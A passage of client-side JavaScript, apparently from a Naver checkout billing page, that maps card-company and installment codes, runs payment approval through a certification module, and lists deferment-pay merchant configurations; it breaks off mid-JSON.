						if (typeof callbackFn2 == 'function') {
							common.value('MSG','success');
							common.value('PGFORMNAME','pgForm_05A');
							common.value('CHARSET', 'UTF-8');
							callbackFn2(common.$value());
						} else {
							tForm.submit();
						}
						
						
						return false;
					}
				);
			}
			</script><div id="01A_OBJECT"></div>										    							   
				<script language="javascript" src="http://dbill.naver.com/dist/js/certificationModule.js?ts=1647221954893" type="text/javascript"></script>
			<script type="text/javascript">
			
			//pg사 carcd로 변환하는 코드를 생성한다.
			var bill_cardcdMap = $H();
				bill_cardcdMap.add('C0','CCLG');
				bill_cardcdMap.add('C1','CCBC');
				bill_cardcdMap.add('C2','CCKJ');
				bill_cardcdMap.add('C3','CCKM');
				bill_cardcdMap.add('C4','CCNH');
				bill_cardcdMap.add('C5','CCLO');
				bill_cardcdMap.add('C7','CCSS');
				bill_cardcdMap.add('C8','CCSU');
				bill_cardcdMap.add('C9','CCCT');
				bill_cardcdMap.add('CA','CCKE');
				bill_cardcdMap.add('CB','CCPH');
				bill_cardcdMap.add('CC','CCJB');
				bill_cardcdMap.add('CD','CCCJ');
				bill_cardcdMap.add('CF','CCHN');
				bill_cardcdMap.add('CH','CCDI');
				bill_cardcdMap.add('CR','UPOP');
			
			//pg사 carcd로 변환하는 코드를 생성한다.
			var bill_quotaMap = $H();
			bill_quotaMap.add('01','0' );
			bill_quotaMap.add('02','2' );
			bill_quotaMap.add('03','3' );
			bill_quotaMap.add('04','4' );
			bill_quotaMap.add('05','5' );
			bill_quotaMap.add('06','6' );
			bill_quotaMap.add('07','7' );
			bill_quotaMap.add('08','8' );
			bill_quotaMap.add('09','9' );
			bill_quotaMap.add('10','10' );
			bill_quotaMap.add('11','11' );
			bill_quotaMap.add('12','12' );
			bill_quotaMap.add('18','18' );
			bill_quotaMap.add('24','24' );
			bill_quotaMap.add('36','36' );
			
			
			function convertCardCd_01A(cardcd){
				if(bill_cardcdMap.hasKey(cardcd)) {
					return bill_cardcdMap.$(cardcd);
				}
				return '';
			}
			
			function convertQuota_01A(quota){
				if(bill_quotaMap.hasKey(quota)) {
					return bill_quotaMap.$(quota);
				}
				return '';
			}
			
			function init_01A() {
				return true;	
			}
			
			function pgApproval_01A(fm, form, callbackFn) {
				certification.request({
					isMobile: form.value('isMobile') == 'true',
					environment: fm.environment.value, 
					serviceId: fm.serviceId.value,
					cardCompanyId: fm.cardCompanyId.value,
					merchantName: fm.merchantName.value,
					amount: fm.amount.value,
					itemName: fm.itemName.value,
					installmentTerm: fm.installmentTerm.value,
					interestFreeYn: fm.interestFreeYn.value,
					domainUri: fm.domainUri.value,
					useCardCertification: form.value('useCardCertification') == 'true',
					callbackFunc : function (response){
						if(response.result == 'success'){
							
							   form.value('tid', response.data.tid);
							form.value('kvpCardCode', response.data.kvpCardCode||'');
							form.value('sessionKey', response.data.sessionKey||'');
							form.value('encryptData', response.data.encryptData||'');    		
					
							form.value('cavv', response.data.cavv||'');
							form.value('xid', response.data.xid||'');
							form.value('eci', response.data.eci||'');
							form.value('certData', response.data.certData||'');
								
							callbackFn("success");
						}else{
							form.value('MSG', '결제가 처리되지 않았습니다');
							if(response.message){
								form.value('MSG', response.message);
							}
							callbackFn("failmsg");
						}
					}
				});
				
				
			}
			
			function approval_01A(common, form, callbackFn) {
				bill.variable._lastCallbackFn = callbackFn;
				bill.variable._returnForm = form;
				bill.variable._returnCommonForm = common;	
				
				var npcbCheckString = bill.npcbCheckStr('01A', common);
				var npcbBlock=false;
			
				bill.commonTransferData(bill.variable._npcbCheckUrl, $H(npcbCheckString), function(str) {
					if(str=='error') {
						npcbBlock=true;
					}
				});
			
				if(npcbBlock==true) {
					return;
				}
					
				form.value('domainUri', location.protocol.concat('//').concat(location.hostname));
				
				form.value('itemName', common.value('TITLE'));
				form.value('amount', common.value('AMT'));
				
				var cardcode = convertCardCd_01A(common.value('CORPCD'));
				form.value('cardCompanyId', cardcode );
				//국민/우리카드의 경우, useCardCertification 'true' 이고 그 외는 'false'
				if(common.value('CORPCD') == 'C3' || common.value('CORPCD') == 'CB') {
					form.value('useCardCertification', 'true');	
				}
				var install = convertQuota_01A(common.value('INSTMO'));
				if(install == '') {
					install = "00";
				} else if( install.length == 1) {
					install = "0" + install;
				}
				form.value('installmentTerm', install);
				
			
				form.value('PGID', bill.convertPgId('01057', common.value('CORPCD'), install, common.value('AMT')));
				form.value('mid_common', bill.convertPgMid('01057', common.value('CORPCD'), install, 'naver_smartstore01', common.value('AMT')));
				form.value('mid_point', bill.convertPgSubMid('01057', common.value('CORPCD'), install, 'naver_smartstore01', common.value('AMT')));
				form.value('serviceId',  form.value('mid_common'));
				if(common.value('NOINTEREST') == 'Y' && common.value('NOINTERESTTYPE') == '01') {
					form.value('interestFreeYn', 'y');
				}
				
				if (bill.isDefermentPay('01057', common.value('CORPCD'), install, common.value('AMT'))) {
					form.value('NOINT_NDISP', '1');
				} else {
					form.value('NOINT_NDISP', '');
				}
			
				//PG 모듈 호출
				var result= pgApproval_01A(form.$value(), form, callbackFn);
				//callbackFn( result );
			}
			
			function return_success_01A(msg) {
				bill.variable._lastCallbackFn("success");
			}
			
			function return_fail_01A(msg) {
				bill.variable._returnForm.value("MSG", msg);
				bill.variable._lastCallbackFn("nomatcherror");
			}
			</script><script type="text/javascript">
			function pgApproval_02C(fm) {
				return 'success';
			}
			
			function init_02C() {
				;
			}
			
			function approval_02C(common, form, callbackFn) {
				var result = pgApproval_02C(form.$value()); 
				callbackFn( result );
			}
			</script>
			<script type="text/javascript">
			var bill = {};
			bill.variable = {
				_initPG : $H({}),
				_approvalPG : $H({}),
				_postApprovalPG : $H({}),
				_formPG : $H({}),
				_preCallUrl : "http://billing.checkout.naver.com/pay/preApproval.nhn",
				_preCertUrl : "http://billing.checkout.naver.com/pay/preCertApproval.nhn",
				_npcbCheckUrl : "http://billing.checkout.naver.com/pay/circuitBreakerState.nhn",
				_callUrl : "http://billing.checkout.naver.com/pay/approval2.nhn",
				_postCallCorsUrl : "http://billing.checkout.naver.com/pay/postApprovalWithCors.nhn",  
				_postCallUrl : "http://billing.checkout.naver.com/pay/postApproval.nhn",
				_mobileSurl : "",
				_mobileRurl : "",
				_virCallUrl : "http://billing.checkout.naver.com/pay/callVirNo.nhn",
				_maxTxtSize : 1728,
				_minTxtSize : 50,
				_chunkSize : 100,
				_bInit : false,
				_init : function() {
					this._initPG.add('01057', init_01A);
					this._approvalPG.add('01057', approval_01A);
					this._formPG.add('01057', $Form('pgForm_01A').$value());
						this._formPG.add('01029', $Form('pgForm_01A').$value());
						this._formPG.add('01030', $Form('pgForm_01A').$value());
						this._formPG.add('01057', $Form('pgForm_01A').$value());
						this._formPG.add('01058', $Form('pgForm_01A').$value());
						this._formPG.add('01059', $Form('pgForm_01A').$value());
						this._formPG.add('01060', $Form('pgForm_01A').$value());
						this._formPG.add('01061', $Form('pgForm_01A').$value());
						this._formPG.add('01043', $Form('pgForm_01A').$value());
						this._formPG.add('01044', $Form('pgForm_01A').$value());
						this._formPG.add('01053', $Form('pgForm_01A').$value());
						this._formPG.add('01026', $Form('pgForm_01A').$value());
						this._formPG.add('01027', $Form('pgForm_01A').$value());
						this._formPG.add('01028', $Form('pgForm_01A').$value());
						this._formPG.add('01063', $Form('pgForm_01A').$value());
						this._formPG.add('01064', $Form('pgForm_01A').$value());
						this._formPG.add('01065', $Form('pgForm_01A').$value());
						this._formPG.add('01066', $Form('pgForm_01A').$value());
						this._formPG.add('01067', $Form('pgForm_01A').$value());
						this._formPG.add('01068', $Form('pgForm_01A').$value());
						this._formPG.add('01023', $Form('pgForm_01A').$value());
						this._formPG.add('01024', $Form('pgForm_01A').$value());
						this._formPG.add('01069', $Form('pgForm_01A').$value());
						this._formPG.add('01052', $Form('pgForm_01A').$value());
						this._formPG.add('01054', $Form('pgForm_01A').$value());
						this._formPG.add('01055', $Form('pgForm_01A').$value());
						this._formPG.add('01056', $Form('pgForm_01A').$value());
						this._formPG.add('01025', $Form('pgForm_01A').$value());
						this._formPG.add('01070', $Form('pgForm_01A').$value());
						this._formPG.add('01045', $Form('pgForm_01A').$value());
						this._formPG.add('01046', $Form('pgForm_01A').$value());
						this._formPG.add('01047', $Form('pgForm_01A').$value());
						this._formPG.add('01048', $Form('pgForm_01A').$value());
						this._formPG.add('01049', $Form('pgForm_01A').$value());
						this._formPG.add('01050', $Form('pgForm_01A').$value());
						this._formPG.add('01051', $Form('pgForm_01A').$value());
						this._formPG.add('01062', $Form('pgForm_01A').$value());
						this._formPG.add('70019', $Form('pgForm_01A').$value());
						
					this._initPG.add('02001', init_02C);
					this._approvalPG.add('02001', approval_02C);
					this._formPG.add('02001', $Form('pgForm_02C').$value());
						
					this._initPG.add('04001', init_04F);
					this._approvalPG.add('04001', approval_04F);
					this._formPG.add('04001', $Form('pgForm_04F').$value());
						
					this._initPG.add('05005', init_05A);
					this._approvalPG.add('05005', approval_05A);
					this._postApprovalPG.add('05005', postApproval_05A);
					this._formPG.add('05005', $Form('pgForm_05A').$value());
						
					this._initPG.add('60001', init_60A);
					this._approvalPG.add('60001', approval_60A);
					this._formPG.add('60001', $Form('pgForm_60A').$value());
						
					this._initPG.add('40001', init_40A);
					this._approvalPG.add('40001', approval_40A);
					this._formPG.add('40001', $Form('pgForm_40A').$value());
						
					this._initPG.add('51277', init_51A);
					this._approvalPG.add('51277', approval_51A);
					this._formPG.add('51277', $Form('pgForm_51A').$value());
						
					
					this._bInit = true;
				},
				_defermentPayList : '{"51304C010":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"300000"},"51065CH10":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"300000"},"51251CH10":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"300000"},"51053C006":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"200000"},"51053C003":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"100000"},"51073CH10":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"300000"},"51053C002":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"100000"},"51053C010":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"300000"},"01065C002":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"100000"},"51223C006":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"200000"},"01069CH10":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"300000"},"01065C003":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"100000"},"51316CH10":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"300000"},"51223C002":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"100000"},"51223C003":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"100000"},"51290CH06":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"100000"},"51219CH10":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"300000"},"51294C010":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"300000"},"51251CH06":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"100000"},"51073CH06":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"100000"},"51270C002":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"100000"},"51270C003":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"100000"},"51243CH06":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"100000"},"01065C006":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"200000"},"01049C006":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"200000"},"01065C010":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"300000"},"01049C003":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"100000"},"01049C002":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"100000"},"51290CH10":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"300000"},"51294C006":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"200000"},"51294C002":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"100000"},"51294C003":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"100000"},"51243CH10":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"300000"},"51107CH10":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"51269C006":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"200000"},"51269C002":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"100000"},"51269C003":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"100000"},"01023CH10":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"300000"},"51069C010":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"300000"},"01049C010":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"300000"},"51297CH10":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"300000"},"51107CH06":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"01061CH06":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"100000"},"51109C002":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"100000"},"01057C010":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"300000"},"51235CH06":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"100000"},"51109C003":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"100000"},"01057C002":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"100000"},"51235CH10":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"300000"},"01057C003":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"100000"},"51109C006":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"200000"},"01057C006":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"200000"},"51297CH06":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"100000"},"51316CH06":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"100000"},"51283CH06":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"100000"},"51060C002":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"100000"},"51060C003":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"100000"},"51239C003":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"100000"},"01053CH10":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"300000"},"51267CH06":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"100000"},"51239C006":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"200000"},"51259CH06":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"100000"},"51082CH10":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"300000"},"51239C002":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"100000"},"51259CH10":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"300000"},"51307CH10":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"300000"},"51267CH10":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"300000"},"51072CH10":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"51277C010":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"300000"},"01061CH10":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"300000"},"01053CH06":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"100000"},"51060C010":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"300000"},"51245C002":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"100000"},"51245C003":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"100000"},"51245C006":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"200000"},"01047CH10":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"300000"},"51239C010":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"300000"},"51287C010":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"300000"},"51069C003":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"100000"},"51072CH06":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51069C002":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"100000"},"51277C006":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"200000"},"51307CH06":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"100000"},"51060C006":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"200000"},"51277C002":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"100000"},"51277C003":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"100000"},"51069C006":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"200000"},"51245C010":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"300000"},"01047CH06":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"100000"},"51261C010":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"300000"},"51261C003":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"100000"},"51261C002":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"100000"},"51287C003":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"100000"},"51287C002":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"100000"},"51255C010":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"300000"},"51261C006":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"200000"},"51287C006":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"200000"},"01043C003":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"100000"},"01043C002":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"100000"},"51076C002":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"100000"},"51266CH10":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"300000"},"51065CH06":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"100000"},"51076C003":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"100000"},"01043C006":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"200000"},"51076C006":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"200000"},"51249CH10":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"300000"},"51082CH06":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"100000"},"51217CH06":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"100000"},"51283CH10":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"300000"},"51302CH06":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"100000"},"51255C003":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"100000"},"51255C002":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"100000"},"51302CH10":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"300000"},"01043C010":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"300000"},"51266CH06":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"100000"},"51249CH06":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"100000"},"01069CH06":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"100000"},"51076C010":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"300000"},"51255C006":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"200000"},"51223C010":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"300000"},"51217CH10":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"300000"},"51302C002":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"100000"},"51302C003":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"100000"},"01067C003":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"100000"},"51071CH06":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"100000"},"51302C006":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"200000"},"01067C006":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"200000"},"01059C006":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"200000"},"01059C002":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"100000"},"01059C003":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"100000"},"51268C010":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"300000"},"51292CH10":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"300000"},"01059C010":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"300000"},"51217C010":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"300000"},"01067C010":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"300000"},"51225C010":{"submid":"naver_PG06","pgid":"51226","mid":"naver_PG06","minamt":"300000"},"51241CH10":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"300000"},"51098CH10":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"300000"},"51306C010":{"submid":"naver_PG52","pgid":"51312","mid":"naver_PG52","minamt":"300000"},"51071CH10":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"300000"},"51217C006":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"200000"},"51217C003":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"100000"},"51217C002":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"100000"},"51098CH06":{"submid":"naver_shoppay46","pgid":"51099","mid":"naver_shoppay46","minamt":"100000"},"51292CH06":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"100000"},"01067C002":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"100000"},"51067C010":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"300000"},"51237CH06":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"100000"},"01055CH06":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"100000"},"51104C002":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"100000"},"51104C003":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"100000"},"51104C006":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"200000"},"51237CH10":{"submid":"naver_PG11","pgid":"51238","mid":"naver_PG11","minamt":"300000"},"01063CH06":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"100000"},"51267C006":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"200000"},"01055CH10":{"submid":"naver_order16","pgid":"01056","mid":"naver_order16","minamt":"300000"},"51265CH06":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"100000"},"51267C002":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"100000"},"51267C003":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"100000"},"51241CH06":{"submid":"naver_PG15","pgid":"51242","mid":"naver_PG15","minamt":"100000"},"51265CH10":{"submid":"naver_PG28","pgid":"51271","mid":"naver_PG28","minamt":"300000"},"51305C003":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"100000"},"51305C006":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"200000"},"51303C010":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"300000"},"51305C002":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"100000"},"51285CH10":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"300000"},"51100CH06":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"100000"},"51281C003":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"100000"},"51281C002":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"100000"},"01023C002":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"100000"},"51109CH06":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"100000"},"01051C010":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"300000"},"51303C002":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"100000"},"51303C003":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"100000"},"51303C006":{"submid":"naver_PG46","pgid":"51309","mid":"naver_PG46","minamt":"200000"},"51100CH10":{"submid":"naver_shoppay48","pgid":"51101","mid":"naver_shoppay48","minamt":"300000"},"51305C010":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"300000"},"51269C010":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"300000"},"51109CH10":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"300000"},"01023C010":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"300000"},"51281C010":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"300000"},"51263CH06":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"100000"},"01029CH06":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"100000"},"51257CH10":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"300000"},"51257CH06":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"100000"},"51247C006":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"200000"},"01029CH10":{"submid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"300000"},"51247C002":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"100000"},"51247C003":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"100000"},"01023C003":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"100000"},"01023C006":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"200000"},"01063CH10":{"submid":"naver_booking14","pgid":"01064","mid":"naver_booking14","minamt":"300000"},"51104C010":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"300000"},"51281C006":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"200000"},"01045C002":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"100000"},"51270CH06":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"100000"},"51074C006":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"200000"},"51074C002":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"100000"},"51296C010":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"300000"},"51078CH10":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"300000"},"51073C002":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"100000"},"51074C003":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"100000"},"51300CH06":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"100000"},"51219C006":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"200000"},"51219C002":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"100000"},"51219C003":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"100000"},"51108CH10":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"300000"},"51067C006":{"submid":"naver_shoppay99","pgid":"51068","mid":"naver_shoppay99","minamt":"200000"},"51300CH10":{"submid":"naver_PG44","pgid":"51301","mid"